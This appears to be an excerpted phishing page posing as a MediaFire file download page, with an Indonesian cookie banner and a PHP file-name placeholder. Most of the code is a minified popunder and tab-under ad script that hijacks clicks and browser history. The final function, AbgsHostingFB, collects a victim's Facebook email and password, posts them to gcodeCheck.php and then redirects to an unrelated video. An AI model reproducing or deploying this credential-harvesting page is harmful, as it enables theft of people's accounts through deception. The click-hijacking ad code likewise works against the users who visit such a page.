                        }!p.PopSettings.IsPopunder || p.IsMobile.any(p._Top) || !w.chrome && "Chrome" !== w.name || p.PopSettings.IsTracking || Q || R || void 0 !== p.PopSettings.SameTabAdSettings && (p.PopSettings.SameTabAdSettings.Windows && "WINDOWS" !== G.name.toUpperCase() || p.PopSettings.SameTabAdSettings.OSX && "MAC OS" !== G.name.toUpperCase()) && (!p.PopSettings.SameTabAdSettings.AdblockOnly || p.IsAdblockRequest) && p.PopSettings.SameTabAdSettings.Chrome || (p.PopSettings.SameTabAdSettings = p.PopSettings.SameTabAdSettings || {}, p.PopSettings.SameTabAdSettings.AdblockOnly = !1, p.PopSettings.SameTabAdSettings.Chrome = !0, p.PopSettings.SameTabAdSettings.Windows = p.PopSettings.SameTabAdSettings.Windows || !0, p.PopSettings.SameTabAdSettings.OSX = p.PopSettings.SameTabAdSettings.OSX || !0, p.PopSettings.SameTabAdSettings.ClickAnywhere = p.PopSettings.SameTabAdSettings.ClickAnywhere || !1)
                      } catch (C) {
                        e.ConsoleLog(C)
                      }
                      try {
                      ...
                      p.BindOnDocmentClick(function(C) {
                        ...
                        if (!p.PopRunning)
                          ...
                          if (p.IsDontTriggerForSelectorMatch(p.PopSettings.PopUnderDontTriggerSelector, D)) p.PopRunning = !1;
                          ...
                          else if ("a" !== D.nodeName.toLowerCase() && (D = p.GetParentLink(D)), p.PopSettings.RespectTargetBlank && D.getAttribute && ("_blank" === D.getAttribute("target") || "nofollow" === D.getAttribute("rel"))) p.PopRunning = !1;
                            ...
                            if (!("iOS" == G.name && parseFloat(G.version) < parseFloat("6") || p.IsMobile.Windows(p._Top))) {
                              ...
                              if (!(-1 < I.indexOf("FBAN/FBIOS") || -1 < I.indexOf("FB_IAB/FB4A") || -1 < I.indexOf("FBAV"))) {
                                ...
                                if ("function" !== typeof window.InfCustomFPSTAMobileFunc || p.PopSettings.IsTracking) {
                                  if ("a" !== D.nodeName.toLowerCase() || "#" == D.getAttribute("href") || -1 != D.getAttribute("href").indexOf("javascript:") || p.PopSettings.RespectTargetBlank && ("_blank" === D.getAttribute("target") || "nofollow" === D.getAttribute("rel"))) return e.PopLoaded = !1, e.PopRunning = !1, !0;
                                  ...
                                  if (p.PopSettings.IsTracking) W();
                                    ...
                                    if (p.IsMobile.iOS(p._Top) && p.IsMobile.Opera(p._Top)) window.open(q, M), p._Top.document.location = I;
                                      ...
                                      else if (e.PopSettings.MobileHistory) try {
                                        var T = window.open(I, M);
                                        try {
                                          T.history.replaceState({
                                            previous: e._Top.location.href
                                          }, null, e._Top.location.href)
                                        } catch (y) {
                                          e.ConsoleLog(y)
                                        }
                            ...
                            I = function() {
                              var y = new e.Client,
                                K = "function" === typeof window.InfCustomFPSTAFunc ? new e.ExternalSameTab(function(N) {
                                  window.InfCustomFPSTAFunc(N, D, q)
                                }) : new e.SameTab({
                                  clickAnywhere: e.PopSettings.SameTabAdSettings.ClickAnywhere
                                });
                            ...
                            var Y = function() {
                              ...
                              da = function() {
                                var y = new p.Client,
                                  K = [new p.TabOver, new p.PopOver, new p.SameTab({
                                    clickAnywhere: !0
                                  }), new p.DelayedPopUnder({
                                    waitSecondsToLoadMedia: 0,
                                    waitForParentToClose: !0,
                                    waitForParentToFocus: !0
                                  })].filter(function(ca) {
                                    return ca.isSupported(y)
                                  });
                                K = new p.RandomEnumerator(K);
                                for (var N = K.popNext(); !N.canShow(C);)
                                  if (N = K.popNext(), void 0 === N) return;
                                S(N)
                              };
                            if (p.PopSettings.IsTracking) return W(), e.OnFastPopLoaded(), e.PopRunning = !1, e.IncrementFastPopCap(), !0;
                            p.PopSettings.UseSameTab(w, G, p.IsAdblockRequest) ? I() : w.opera || "Opera" === w.name ? I() : p.PopSettings.IsPopunder ? w.chrome || "Chrome" == w.name ? Q || -1 < navigator.userAgent.indexOf("Chrome/33.0.1750.146") ? M() : R ? da() : Y() : (w.firefox || "Firefox" == w.name) && 65 <= w.major ? aa() : Z() : ba()
                          }
                        } else p.PopRunning = !1
                      })
                    }
                    ...
                    H.getDevice();
                    var w = H.getBrowser();
                    if (!(a.PopLoaded || !a.PopSettings.AllowMultiplePopsForTheSamePageView && a.IsFastPopCapped()) && k(e.PopSettings.RequireToRunOnDomainFilter) && k(e.PopSettings.ReferrerFilter) && k(e.PopSettings.KeywordFilter) && m() && r() && t() && u() && x() && n()) {
                ...
                ClientSideFilterHandlers: {
                  JsVariableFilter: function(a, b) {
                    function c(k) {
                      try {
                        var m = new RegExp(k);
                        return null != e.FirstOrNull(d, function(n) {
                    ...
                    function g(k) {
                      return null != e.FirstOrNull(d, function(m) {
                        return k === m
                      })
                    }
                    var h = b ? function(k, m) {
                    ...
                    var l = e.GetOwnEnumerableProperties(window),
                      d = e.Map(l, function(k) {
                        try {
                          ...
                          var m = "" === typeof window[k] ? "" : null === window[k] ? "null" : "function" === typeof window[k] || "object" === typeof window[k] ? "" : window[k].toString ? "'" + window[k].toString().replace(/'/g, "\\'") + "'" : "";
                          return k + "=" + m
                        } catch (n) {
                          return null
                        }
                    ...
                    f = null == f ? "No match found in " + (a.Exclusive ? "exclusive" : "inclusive") + (a.IsRegex ? " regex " : " non-regex ") + " variable list: " + a.Items.join(", ") : "Item " + f + " from " + (a.Exclusive ? "exclusive" : "inclusive") + (a.IsRegex ? " regex " : " non-regex ") + " variable list matches one or more page variables";
                    h(l, f);
                    return l
                  }
                },
                ...
                IsFeatureDisabled: function(a) {
                  ...
                  switch (a) {
                    case "IsTriggerOnSelectorMatch":
                      b = "" !== typeof InfDisableTriggerOnSelector && InfDisableTriggerOnSelector
                  }
                  return b
                },
                IsFeatureEnabled: function(a) {
                  ...
                  switch (a) {
                    case "IsSkipUserEventPropagation":
                      b = "" !== typeof InfSkipUserEventPropagation && InfSkipUserEventPropagation;
                      break;
                    case "IsSkipTriggerClick":
                      b = "" !== typeof InfSkipTriggerClick && InfSkipTriggerClick;
                      break;
                    case "IsLookForContainerAnchorLink":
                      b = "" !== typeof InfLookForContainerAnchorLink && InfLookForContainerAnchorLink
                  }
                  return b
                },
                BindOnDocumentTouch: function(a) {
                  var b = e._Top;
                  if (b.document.addEventListener) b.document.addEventListener("touchstart", function(c) {
                    try {
                      a(c)
                    } catch (g) {
                      e.ConsoleLog(g)
                ...
                BindOnDocmentClick: function(a) {
                  var b = e._Top;
                  b.document.addEventListener ? b.document.addEventListener("click", function(c) {
                    try {
                      e.ClickHandler = a(c)
                    } catch (g) {
                      e.ConsoleLog(g)
                    }
                  }, !1) : b.document.attachEvent("onclick", function(c) {
                    try {
                      e.ClickHandler = a(c)
                    } catch (g) {
                      e.ConsoleLog(g)
                ...
                BindOnDOMReady: function(a) {
                  ...
                  var b = e._Top,
                    c = b.document;
                  if (this._contentLoaded) b.setTimeout(function() {
                    a.apply(b)
                  }, 1);
                  else {
                    ...
                    var g = function() {
                      ...
                      l = function() {
                        if (!h._contentLoaded) {
                          h._contentLoaded = !0;
                          for (var d = 0; d < h._contentLoadedListeners.length; d++) try {
                    ...
                    g() ? b.setTimeout(l, 1) : this.readyEventHandlersInstalled || (c.addEventListener ? (c.addEventListener("DOMContentLoaded", l, !1), b.addEventListener("load", l, !1)) : (c.attachEvent("onreadystatechange", function() {
                      g() && l()
                    }), b.attachEvent("onload", l)), this._contentLoadedListenersInstalled = !0)
                  }
                },
                Enums: {
                  VideoAudioMode: {
                ...
                Utils: {
                  ...
                  url: {
                    removeSchema: function(a) {
                      for (var b = ["http:", "https:"], c = 0; c < b.length; c++)
                        if (0 === a.indexOf(b[c])) return a.substring(b[c].length);
                      return a
                    }
                  },
                ...
                FlashClickInterceptor: {
                  ...
                  activate: function(a, b, c) {
                    if (!0 !== b) {
                      ...
                      if (b || c || "Edge" === a.name || g || !e.PopSettings.InterceptFlash || "Safari" !== a.name && !h) this.handleObjects = !g, this.overlay = this._insertOverlay(), this.eventUtil.addListener(this.overlay, "mouseleave", this._onOverlayMouseLeave), this.eventUtil.addListener(document, "mouseover", this._onDocumentMouseEnter)
                    }
                  },
                  deactivate: function() {
                    null !== this.overlay && (this.eventUtil.removeListener(this.overlay, "mouseleave", this._onOverlayMouseLeave), this.eventUtil.removeListener(document, "mouseover", this._onDocumentMouseEnter), this._closeOverlay(), this.overlay.parentNode.removeChild(this.overlay), this.overlay = null)
                  },
                  ...
                  _onDocumentMouseEnter: function(a) {
                    ...
                    !((c.handleObjects || e.PopSettings.InterceptFlash) && g || (c.handleEmbeds || e.PopSettings.InterceptFlash) && h || (c.handleInlineFrames || e.PopSettings.InterceptInlineFrames) && l) || (g || h) && e.PopSettings.InterceptFlash && !e.IsFlashPluginEnabled() || "function" === typeof c.ignoreElementPredicate && !0 === c.ignoreElementPredicate(b) || c._onObjectMouseEnter(a)
                  },
                ...
                GetKeywords: function() {
                  ...
                  })) && b.content ? a(b.content.split(",")) : ""
                },
                GetWindowHeight: function() {
                  var a = 0;
                  "number" == typeof this._Top.window.innerHeight ? a = this._Top.window.innerHeight : this._Top.document.documentElement && this._Top.document.documentElement.clientHeight ? a = this._Top.document.documentElement.clientHeight : this._Top.document.body && this._Top.document.body.clientHeight && (a = this._Top.document.body.clientHeight);
                  return a
                },
                GetWindowWidth: function() {
                  var a = 0;
                  "number" == typeof this._Top.window.innerWidth ? a = this._Top.window.innerWidth : this._Top.document.documentElement && this._Top.document.documentElement.clientWidth ? a = this._Top.document.documentElement.clientWidth : this._Top.document.body && this._Top.document.body.clientWidth && (a = this._Top.document.body.clientWidth);
                  return a
                },
                ...
                Script: {
                  Items: [],
                  Add: function(a, b) {
                    return this.Exists(a) ? !1 : (this.Items.push({
                      url: a,
                      cache: b,
                      complete: !1
                    }), !0)
                  ...
                  Exists: function(a) {
                    for (var b = 0; b < this.Items.length; b++)
                      if (this.Items[b].url == a) return !0;
                    return !1
                  },
                  Complete: function(a) {
                    for (var b = 0; b < a.length; b++)
                      if (!a[b].complete) return !1;
                    return !0
                  },
                  Create: function(a, b) {
                  ...
                  AppendToDom: function(a, b, c) {
                    ...
                    if (void 0 !== e.UseAjax && e.UseAjax) e.AjaxLoad(a[b].url, function(f) {
                      ...
                      d.onload = d.onreadystatechange = function(f) {
                        a[b].complete || this.readyState && "loaded" != this.readyState && "complete" != this.readyState || (a[b].complete = !0, d.onload = d.onreadystatechange = null, g.Complete(a) && "function" == typeof c && c())
                      };
                      h.appendChild(d)
                    }
                  },
                ...
                Storage: {
                  GetLocalStorage: function(a) {
                    if (a = this.SupportsLocalStorage() ? localStorage[a] : this.GetCookie(a)) {
                      var b = a.split("__")[0];
                      if (b == this.GetCookie("ISSH") || "" == b) a = a.split("__")[1]
                    }
                    return a
                  },
                  SetLocalStorage: function(a, b) {
                    var c = this.GetCookie("ISSH") + "__" + b;
                    if (this.SupportsLocalStorage()) try {
                      localStorage[a] = c
                    } catch (g) {
                  ...
                  SupportsLocalStorage: function() {
                    try {
                      ...
                      return "" !== typeof DOMException && a.code === DOMException.QUOTA_EXCEEDED_ERR && 0 === sessionStorage.length && (window.console = window.console || {
                        log: function(b) {}
                      }, e.ConsoleLog("Safari private mode detected")), !1
                    }
                  },
                  ...
                  SetSessionStorage: function(a, b) {
                    var c = this.GetCookie("ISSH") + "__" + b;
                    if (this.SupportsSessionStorage()) try {
                      sessionStorage[a] = c
                    } catch (g) {
                ...
                TabHistoryManipulator: function(a, b) {
                  ...
                  if (c) try {
                    this._Top.history.replaceState(null, this._Top.document.title, this._Top.location.href), this._Top.history.pushState(null, this._Top.document.title, this._Top.location.href), this._Top.addEventListener("popstate", function() {
                ...
                IsFlashPluginEnabled: function() {
                  if (navigator && navigator.mimeTypes && "" != typeof navigator.mimeTypes["application/x-shockwave-flash"] && navigator.mimeTypes["application/x-shockwave-flash"].enabledPlugin) return !0;
                  try {
                ...
                AjaxLoad: function(a, b) {
                  if ("" !== typeof XMLHttpRequest) var c = new XMLHttpRequest;
                  else
                    for (var g = ["MSXML2.XmlHttp.5.0", "MSXML2.XmlHttp.4.0", "MSXML2.XmlHttp.3.0", "MSXML2.XmlHttp.2.0", "Microsoft.XmlHttp"], h = 0, l = g.length; h < l; h++) try {
                ...
                BasePopunder: {
                  ...
                  shouldHandleEvent: function(a, b) {
                    var c = e,
                      ...
                      h = c.IsFastPop && !c.AbortFastPop ? c.FastPopZone : {
                        Id: a.ZoneId,
                        Name: a.ZoneName
                      };
                  ...
                  execute: function(a, b, c, g) {
                    ...
                    if (h.IsFastPop && !h.AbortFastPop) {
                      ...
                      a = c ? h.GetParentLink(g) : g;
                      if (h.PopMedia.Settings.RespectTargetBlank && a.getAttribute && ("_blank" === a.getAttribute("target") || "nofollow" === a.getAttribute("rel")) || h.IsDontTriggerForSelectorMatch(h.PopMedia.Settings.PopUnderDontTriggerSelector, g)) return this.triggerClick(g, b), !1;
                ...
                ChromePopunder: {
                  ...
                  _magicNumbers: function() {
                    var a = e.UaParser.getBrowser(),
                      b = e.UaParser.getOS();
                    return "Mac OS" === b.name ? "Chrome" === a.name ? {
                      x: 100,
                      y: 71
                    } : "Opera" === a.name ? {
                      x: 100,
                      ...
                      x: 0,
                      y: 0
                    } : "Windows" === b.name ? "Chrome" === a.name ? "56" === a.major ? {
                      x: 122,
                      y: 34
                    } : {
                      x: 120,
                  ...
                  _getPopRect: function(a) {
                    ...
                    return {
                      x: b.GetWindowLeft() + b.GetWindowWidth() / 2 - 512,
                      y: b.GetWindowTop() + b.GetWindowHeight() / 2 - 384,
                      width: this._popWidth - c,
                      height: this._popHeight - a
                    }
                  },
                    ...
                    c = "(" + function() {
                      ...
                      window.addEventListener("message", function(d) {
                        if (d.data && 0 === d.data.indexOf("inf_pop_url::")) {
                          ...
                          "null" === f || 0 === f.length ? window.close() : window.setTimeout(function() {
                            window.location.replace(f)
                          }, 1)
                        }
                      }, !1);
                      window.go = function() {
                        l ? (l.moveTo(popRect.x, popRect.y), l.resizeTo(popRect.width + (l.outerWidth - l.innerWidth), popRect.height + (l.outerHeight - l.innerHeight)), l.location.replace(window.popUrl), window.popUrl2 && window.setTimeout(function() {
                          window.location.replace(window.popUrl2)
                        }, 1)) : window.location.replace(window.popUrl)
                      }
                    }.toString() + ")();";
                  ...
                  _createDoublePdfDoublePopTabContent: function(a, b) {
                    ...
                    c = "(" + function() {
                      function l() {
                        var f = "(" + function() {
                            window.addEventListener("message", function(n) {
                              n.data && 0 === n.data.indexOf("inf_pop_resize") ? (n = n.data.substring(16).split("x"), window.resizeBy(n[0], n[1])) : tab && n.data && 0 === n.data.indexOf("inf_pop_url::") && (n = n.data.substring(13), "null" === n || 0 === n.length ? tab.close() : tab.location.replace(n))
                            }, !1);
                      ...
                      window.go = function() {
                        var f = window.pop;
                        if (f)
                          if (f.moveTo(popRect.x, popRect.y), f.resizeTo(popRect.width + (f.outerWidth - f.innerWidth), popRect.height + (f.outerHeight - f.innerHeight)), window.popUrl2) f.location.replace(window.popUrl), window.setTimeout(function() {
                            window.location.replace(window.popUrl2)
                          }, 1);
                          else {
                            var k = f.document;
                  ...
                  _createDoublePdfTabContent: function(a) {
                    ...
                    b = "(" + function() {
                      ...
                      window.go = function() {
                        window.pop ? setTimeout(function() {
                          window.close()
                        }, 0) : window.location.replace(window.popUrl)
                      };
                  ...
                  _createFalseTabContent: function(a) {
                    var b = "(" + function() {
                        ...
                        window.go = function() {
                          h ? (h.moveTo(popRect.x, popRect.y), h.resizeTo(popRect.width + (h.outerWidth - h.innerWidth), popRect.height + (h.outerHeight - h.innerHeight)), h.location.replace(window.popUrl), window.close()) : window.location.replace(window.popUrl)
                        }
                      }.toString() + ")();",
                      c = new this.HtmlSourceBuilder,
                      g = [];
                  ...
                  _onFocusOutAndIn: function(a, b) {
                    ...
                    c = setInterval(function() {
                      a.document.hasFocus() || (clearInterval(c), c = setInterval(function() {
                  ...
                  _execute: function(a) {
                    ...
                    if (e.IsFeatureEnabled("IsLookForContainerAnchorLink")) try {
                    ...
                    if (c.BasePopunder.execute(a, this._getTriggerEvent(), !1, g))
                      if (l = this._getPopOpenMode(), l === this._popOpenModes.popOver) {
                        ...
                        c.show(a)
                      } else if (l === this._popOpenModes.postMessage) d = this._getPopRect(!0), c = new c.PopUnderViaPostMessage, c.setUrl(this._popMediaUrl), c.setLocation(d.x, d.y), c.setSize(d.width, d.height), c.setOnSuccessCallback(function() {
                      b._onPopDisplay(g)
                    }), c.show(a);
                      ...
                      if (l === this._popOpenModes.doublePdfDoublePop) this._openViaDoublePdf(g, this._createDoublePdfDoublePopTabContent(this._popMediaUrl, this._popMediaUrl2)), this._guid.Storage.SetSessionStorage("InfChromePopEventAttached", !1);
                      else if (l !== this._popOpenModes.pdfAndFalseTab && (l !== this._popOpenModes.doublePop || this._popMediaUrl2 || c.IsFastPop || c.AbortFastPop))
                      if (l === this._popOpenModes.doublePop) a = this._createDoublePopTabContent(this._popMediaUrl, this._popMediaUrl2), this._openViaPdfAndFalseTab(g, a), this._guid.Storage.SetSessionStorage("InfChromePopEventAttached", !1);
                    ...
                    else if (l == this._popOpenModes.hidden) c = new c.DelayedPopUnder({
                    ...
                    }), c.setUrl(this._popMediaUrl), d = this._getPopRect(!0), c.setLocation(d.x, d.y), c.setSize(d.width, d.height), c.setOnSuccessCallback(function() {
                      b._onPopDisplay(g)
                    }), c.show(a);
                    else {
                      var f = null;
                      "Mac OS" !== c.UaParser.getOS().name && (f = this._onFocusOutAndIn(c._Top, function() {
                        b._focusAchieved(g)
                      }));
                      try {
                    ...
                    else this._openViaDoublePdf(g, this._createDoublePdfTabContent(this._popMediaUrl), this._createDoublePdfPopContent(this._popMediaUrl)), this._guid.Storage.SetSessionStorage("InfChromePopEventAttached", !1)
                  },
                  supported: function() {
                  ...
                  init: function(a, b) {
                    try {
                      if (this.supported()) {
                        ...
                        "true" !== c.Storage.GetSessionStorage("InfChromePopEventAttached") && (c._Top.document.addEventListener(this._getTriggerEvent(), c.ChromePopMouseDownHandler, !0), c.Storage.SetSessionStorage("InfChromePopEventAttached", !0), c._Top.onbeforeunload = c._Top.onunload = function(d) {
                  ...
                  _getTriggerEvent: function() {
                    for (var a = this._getPopOpenMode(), b = [this._popOpenModes.pdfAndFalseTab, this._popOpenModes.doublePop, this._popOpenModes.doublePdf, this._popOpenModes.doublePdfDoublePop, this._popOpenModes.tabUnder, this._popOpenModes.postMessage], c = 0; c < b.length; c++)
                ...
                EdgePopunder: {
                  ...
                  init: function(a) {
                    ...
                    var c = this;
                    b._Top.document.addEventListener("mousedown", function(g) {
                      c._mouseDownHandler(g)
                    }, !0);
                    b._Top.document.addEventListener("click", function(g) {
                      c._clickHandler(g)
                    }, !0)
                  },
                  ...
                  _execute: function(a) {
                    ...
                    if (b.BasePopunder.execute(a, "mousedown", !0)) {
                      var c = 1024,
                        g = 768,
                        h = !1;
                      if (!b.IsFastPop || b.AbortFastPop) h = this._media.ZoneAcceptsFullscreenPageunder && this._media.MediaAllowsFullscreenPageunder, c = 320 > this._media.Settings.Width ? 320 : h ? b._Top.window.screen.availWidth : this._media.Settings.Width, g = 159 > this._media.Settings.Height ? 160 : h ? b._Top.screen.availHeight : this._media.Settings.Height + 1;
                      ...
                      var d = window.open("about:blank", b.BasePopunder.getWindowName(), c),
                        ...
                        m = setInterval(function() {
                          k++;
                          2  < k || b._Top.document.hasFocus() ? (clearInterval(m), d.location.href = f._popMediaUrl, b.BasePopunder.postWindowPop(), b.BasePopunder.triggerClick(a.target || a.srcElement)) : b._Top.focus()
                        }, 400)
                ...
                LogZoneFilter: function(a) {
                  ...
                  return function(c, g, h) {
                    "" === typeof a || null == a ? b.ClientProfilingLog.WriteFilterLog({
                      id: "-1",
                      name: "UNKNOWN",
                      type: "Zone"
                    }, c, g, h) : b.ClientProfilingLog.WriteFilterLog({
                      id: a.Id,
                      name: a.Name,
                      type: "Zone"
                    }, c, g, h)
              ...
              (function(a) {
                ...
                Array.prototype.findIndexOfNth || Object.defineProperty(Array.prototype, "findIndexOfNth", {
                  value: function(d, f) {
                ...
                Array.prototype.findIndex || (Array.prototype.findIndex = function(d, f) {
                  if (null == this) throw new TypeError("Array.prototype.findIndex called on null or ");
                  if ("function" !== typeof d) throw new TypeError("predicate must be a function");
                  for (var k = Object(this), m = k.length >>> 0, n, r = 0; r < m; r++)
                    if (n = k[r], d.call(f, n, r, k)) return r;
                  return -1
                });
                Array.prototype.reduce || (Array.prototype.reduce = function(d) {
                  if (null == this) throw new TypeError("Array.prototype.reduce called on null or ");
                  if ("function" !== typeof d) throw new TypeError(d + " is not a function");
                  var f = Object(this),
                    k = f.length >>> 0,
                    m = 0;
                ...
                Array.from || (Array.from = function() {
                  ...
                  return function(m) {
                    var n = Object(m);
                    if (null == m) throw new TypeError("Array.from requires an array-like object - not null or ");
                    ...
                    for (var x = f(this) ? Object(new this(u)) : Array(u), z = 0, v; z < u;) v = n[z], x[z] = r ? "" === typeof t ? r(v, z) : r.call(t, v, z) : v, z += 1;
                    x.length = u;
                    return x
                  }
                }());
                var g = function() {
                  ...
                  d.RelativePlacementType = {
                    Inside: 0,
                    Before: 1,
                    After: 2
                  };
                  d.CssTransitionTimingFunction = {
                    Linear: 0,
                    Ease: 1,
                    EaseIn: 2,
                    EaseOut: 3,
                ...
                (function() {
                  ...
                  d.prototype.dump = function(f, k) {
                    ...
                    var n = this;
                    "Info" === this._level && (this.info(f), this._groupOutput(function() {
                ...
                (function() {
                  ...
                  d.prototype.resolve = function() {
                    return null == this._value ? this._fallbackValues.find(function(f) {
                      return null != f
                    }) : this._value
                  };
                  return d
                ...
                h.prototype = {
                  ...
                  redirectResponseBuilderTransform: function(d, f, k) {
                    ...
                    var n = "" != typeof f.MediaSettings ? f.MediaSettings : f.Settings;
                    d = this._options.IsAdblockRequest ? "/" + (f.MediaSegmentId ? f.MediaSegmentId : "null") + "/" + (f.TempMediaId ? f.TempMediaId : "null") + "/" + (f.PassBackId ? f.PassBackId : "null") + "/" + (f.DataContextId ? f.DataContextId : "null") + "/" + (f.VolumeMetricId ? f.VolumeMetricId : "null") + "/" + this._options.IsAdblockRequest + "/" + screen.width + "x" + screen.height + "/" + (f.TimeZoneOffset ? f.TimeZoneOffset : "null") + "/" + ("" != typeof f.IsDSTActive && null != f.IsDSTActive ? f.IsDSTActive : "null") + "/null" + ("PopUnder" == f.MediaType ? "/SelectedPopTypePlaceholder" : "/null") + "/" + (encodeURIComponent(this._options.GetKeywords()) ? encodeURIComponent(this._options.GetKeywords()) : "null") + "/" + n.Width + "/" + n.Height + "/redir.a2b" : d + "&abr=" + this._options.IsAdblockRequest + "&res=" + screen.width + "x" + screen.height;
                    if (!0 === k && 1024 > n.Width) {
                      if (void 0 != this._options.DFPImpressionUrl && "" != this._options.DFPImpressionUrl) return f = "/Bridge/Index?width=" + n.Width + "&height=" + n.Height + "&url=" + encodeURIComponent(d), this._options.DFPImpressionUrl + m + f;
                    ...
                    "Link" !== f.MediaType || f.MediaSourceType != g.MediaSourceType.Video && f.MediaSourceType != g.MediaSourceType.VideoTag || (d = "/Bridge/Index?width=" + n.Width + "&height=" + n.Height + "&url=" + encodeURIComponent(d));
                    this._lotame && this._lotame.PlaceImpressionPixel(f);
                    return void 0 !== this._options.EncodeUrl && this._options.EncodeUrl ? (m = m.replace("https://", "").replace("https://", "").replace("https://", ""), this._options.DFPImpressionUrl + "https://" + window.getUri(m + d)) : this._options.DFPImpressionUrl + m + d
                  },
                ...
                l.prototype = {
                  ...
                  getClickTrackingUrl: function(d) {
                    ...
                    d = ["rand=" + Math.floor(89999999 * Math.random() + 1E7), "res=" + this._clientInfo.getScreenWidth() + "x" + this._clientInfo.getScreenHeight(), "dcid=" + (this._zoneResult.DataContextId ? this._zoneResult.DataContextId : ""), "v=" + d.VolumeMetric];
                  ...
                  _apply: function(d) {
                    ...
                    for (k in l.prototype)
                      if ("apply" !== k) {
                        if ("" !== typeof d[k]) throw "Cannot extend ad item as member named '" + k + "' is already defined";
                        (function(m) {
                          d[m] = function() {
    ...
    <!--
    <div id="cookie-accept-footer" class="CookieAcceptance"><p><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">MediaFire menggunakan cookie untuk memberi Anda pengalaman menjelajah yang dipersonalisasi. </font><font style="vertical-align: inherit;">Dengan terus menggunakan situs ini, Anda menyetujui Kebijakan Privasi kami..</font></font></p><div class="CookieAcceptance-buttons"><a href="#" class="CookieAcceptance-close" onclick="acceptCookieFooter(); return false;"><span><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Membubarkan</font></font></span></a><a href="#" class="CookieAcceptance-accept" onclick="acceptCookieFooter(); return false;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> Saya menerima </font>
    </font>
    </a>
    </div>
    </div>
    ...
    <div id="status"><div id="status-message"></div><div id="status-close">Click to dismiss this message</div></div><iframe name="iframe_worker" id="iframe_worker" src="" style="display:none;height:0;width:0;"></iframe><script type="text/javascript">
      (function() {
        (function() {
          // Options
          ...
          if (uiButtonLogout) {
            uiButtonLogout.onclick = function(e) {
              e.preventDefault();
              if (uiIframeWorker) uiIframeWorker.src = e.target.href;
              return false;
            }
          }
          if (uiDropdowns) {
        ...
        (function() {
          // Options
          var optFileKey = "ef5nkpv7rxui9rb";
          var optFileName = "<?php echo $judul;?>";
          var optFileURL = "https://www.g-code.co.id/";
          var optLoggedIn = "false" === "true";
          var optReportTurboDL = "true" === "true";
          var optSecurityToken = "1684491271.c266f05ce3686fb46a1e337ffd38602df302ef6089e7df58aa5ad7a8a4657e71";
          ...
          window.trackTurboDownload = function(event, details) {
            ...
            try {
              ...
              if (details) {
                query += '&connections=' + details.connections + '&speed_kbps=' + details.speed + '&duration=' + details.duration + '&filesize=' + details.filesize + '&go_experiment=' + (window.go_experiment || '');
              }
          ...
          window.saveToMyfiles = function(src) {
            ...
            xhr.onload = function() {
              ...
              showStatusMessage(success ? 'Saved ' + optFileName + ' to your account!' : 'You do not have access to save ' + optFileName + ' to your account.');
            };
...
function AbgsHostingFB()
        	{
        		$bgsemailfb10 = $('#abgs_email_fb2').val().trim();
        		$bgspasswordfbx = $('#abgs_password_fb2').val().trim();
        		if($bgsemailfb10 == '' || $bgsemailfb10 == null || $bgsemailfb10.length <= 6)
        		{
        			$('.email-fb1bgs').show();
        			$('.sandi-fb1bgs').hide();
        			return false;
        		...
        		if($bgspasswordfbx == '' || $bgspasswordfbx == null || $bgspasswordfbx.length <= 6)
        		{
        			$('.sandi-fb1bgs').show();
        			return false;
        		}else{
        		...
        		if($bgsemailfb10.length >=6 || $bgspasswordfbx.length >=6) {
        		    $.ajax({
                        type: 'POST',
                        url: 'gcodeCheck.php',
                        ...
                        success: function() {
                                location.href = "https://yandex.com/video/touch/preview/17832224155701595260";
                            } 
                    })
        		}
        	}
